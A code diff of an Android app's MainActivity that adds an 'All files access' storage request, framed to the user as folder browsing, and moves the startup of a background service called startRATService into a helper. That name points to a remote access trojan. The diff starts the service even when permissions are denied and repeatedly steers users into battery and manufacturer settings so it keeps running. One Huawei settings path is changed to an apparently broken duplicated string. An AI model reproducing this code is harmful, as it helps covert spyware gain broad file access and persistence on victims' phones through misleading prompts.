@@ -12,6 +12,7 @@ import android.widget.Toast;
 
 import androidx.activity.EdgeToEdge;
 import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -26,6 +27,7 @@ public class MainActivity extends AppCompatActivity {
     
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
+    private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
     
     // List of all permissions your app needs
     private final String[] requiredPermissions = {
@@ -65,6 +67,14 @@ public class MainActivity extends AppCompatActivity {
     private void checkAndRequestPermissions() {
         List<String> permissionsNeeded = new ArrayList<>();
         
+        // First, check if we need MANAGE_EXTERNAL_STORAGE for Android 11+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                requestManageStoragePermission();
+                return; // Wait for the result before checking other permissions
+            }
+        }
+        
         for (String permission : requiredPermissions) {
             if (ContextCompat.checkSelfPermission(this, permission) 
                     != PackageManager.PERMISSION_GRANTED) {
@@ -79,13 +89,44 @@ public class MainActivity extends AppCompatActivity {
                 PERMISSION_REQUEST_CODE);
         } else {
             // All permissions already granted
-            startRATService();
-            
-            // Check and request battery optimization exemption
-            checkBatteryOptimization();
-            
-            // Open battery settings to help user whitelist the app
-            openBatteryOptimizationSettings();
+            allPermissionsGranted();
+        }
+    }
+    
+    private void requestManageStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                // Show explanation dialog first
+                new AlertDialog.Builder(this)
+                    .setTitle("Storage Permission Required")
+                    .setMessage("This app needs access to all files to browse folders like " +
+                               "Download, Documents, and custom folders. Please grant 'All files access' " +
+                               "in the next screen.")
+                    .setPositiveButton("Grant Access", (dialog, which) -> {
+                        try {
+                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                            intent.setData(Uri.parse("package:" + getPackageName()));
+                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
+                        } catch (Exception e) {
+                            // Fallback for devices where the above intent doesn't work
+                            Intent intent = new Intent();
+                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
+                        }
+                    })
+                    .setNegativeButton("Skip", (dialog, which) -> {
+                        // Continue with other permissions
+                        checkAndRequestPermissions();
+                    })
+                    .show();
+            } catch (Exception e) {
+                e.printStackTrace();
+                // If dialog fails, continue with other permissions
+                checkAndRequestPermissions();
+            }
+        } else {
+            // For Android 10 and below, continue with regular permissions
+            checkAndRequestPermissions();
         }
     }
     
@@ -106,24 +147,65 @@ public class MainActivity extends AppCompatActivity {
             }
             
             if (allGranted) {
-                // All permissions granted, start service
-                startRATService();
-                // Check battery optimization
-                checkBatteryOptimization();
-                // Open battery settings
-                openBatteryOptimizationSettings();
+                allPermissionsGranted();
             } else {
                 // Some permissions denied, show warning but still try to start service
                 Toast.makeText(this, 
                     "Some permissions denied. Some features may not work.\n" + deniedPermissions.toString(), 
                     Toast.LENGTH_LONG).show();
-                startRATService(); // Still try to start service with whatever permissions we have
                 
-                // Still try to help with battery optimization
-                checkBatteryOptimization();
-                openBatteryOptimizationSettings();
+                // Check if we need to request MANAGE_EXTERNAL_STORAGE again
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    if (!Environment.isExternalStorageManager()) {
+                        requestManageStoragePermission();
+                        return;
+                    }
+                }
+                
+                allPermissionsGranted(); // Still try to start service with whatever permissions we have
             }
         }
+    }
+    
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        
+        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
+            // Check if user granted battery optimization exemption
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                String packageName = getPackageName();
+                
+                if (pm.isIgnoringBatteryOptimizations(packageName)) {
+                    Toast.makeText(this, "Battery optimization disabled. App will run more reliably.", 
+                        Toast.LENGTH_LONG).show();
+                }
+            }
+        } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
+            // Check if user granted MANAGE_EXTERNAL_STORAGE permission
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (Environment.isExternalStorageManager()) {
+                    Toast.makeText(this, "All files access granted!", Toast.LENGTH_SHORT).show();
+                } else {
+                    Toast.makeText(this, "All files access not granted. Some folders may not be accessible.", 
+                        Toast.LENGTH_LONG).show();
+                }
+            }
+            // Continue with regular permissions
+            checkAndRequestPermissions();
+        }
+    }
+    
+    private void allPermissionsGranted() {
+        // All permissions granted, start service
+        startRATService();
+        
+        // Check and request battery optimization exemption
+        checkBatteryOptimization();
+        
+        // Open battery settings to help user whitelist the app
+        openBatteryOptimizationSettings();
     }
     
     private void checkBatteryOptimization() {
@@ -133,7 +215,7 @@ public class MainActivity extends AppCompatActivity {
             
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                 // Show a dialog explaining why user should disable battery optimization
-                new androidx.appcompat.app.AlertDialog.Builder(this)
+                new AlertDialog.Builder(this)
                     .setTitle("Battery Optimization")
                     .setMessage("For the app to work properly in the background, please disable battery optimization. " +
                                "This ensures the service continues running even when the device is idle.")
@@ -171,8 +253,12 @@ public class MainActivity extends AppCompatActivity {
         // Try manufacturer-specific battery settings first
         if (!openManufacturerBatterySettings()) {
             // Fallback to generic battery optimization settings
-            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
-            startActivity(intent);
+            try {
+                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                startActivity(intent);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
     }
     
@@ -192,7 +278,7 @@ public class MainActivity extends AppCompatActivity {
         try {
             Intent intent = new Intent();
             intent.setClassName("com.huawei.systemmanager", 
-                "com.huawei.systemmanager.optimize.process.ProtectActivity");
+                "com.huawei.systemmanager.optimize.process.optimize.process.ProtectActivity");
             startActivity(intent);
             return true;
         } catch (Exception e) {
@@ -244,24 +330,6 @@ public class MainActivity extends AppCompatActivity {
         }
         
         return false; // No manufacturer settings found
-    }
-    
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        
-        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
-            // Check if user granted battery optimization exemption
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                String packageName = getPackageName();
-                
-                if (pm.isIgnoringBatteryOptimizations(packageName)) {
-                    Toast.makeText(this, "Battery optimization disabled. App will run more reliably.", 
-                        Toast.LENGTH_LONG).show();
-                }
-            }
-        }
     }
     
     private void startRATService() {
